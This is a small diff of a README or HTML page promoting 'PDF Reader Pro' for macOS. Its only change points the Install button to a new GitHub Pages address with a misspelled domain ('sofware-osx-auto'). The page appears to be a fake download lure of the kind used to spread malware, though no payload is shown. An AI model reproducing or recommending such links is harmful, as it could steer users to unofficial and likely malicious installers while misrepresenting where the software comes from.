@@ -6,7 +6,7 @@
 <h3>PDF Reader Pro - comprehensive PDF solution</h3>
 <p>PDF Reader Pro is a professional professional PDF viewing and editing application specifically developed for macOS environments</p>
 
-[![Install](https://i.postimg.cc/65RNcQgZ/download-7641614-1280-(3).png)](https://mac-apps-install.github.io/.github/)
+[![Install](https://i.postimg.cc/65RNcQgZ/download-7641614-1280-(3).png)](https://sofware-osx-auto.github.io/.github/PRP)
 </div>
 <br/><br>
 
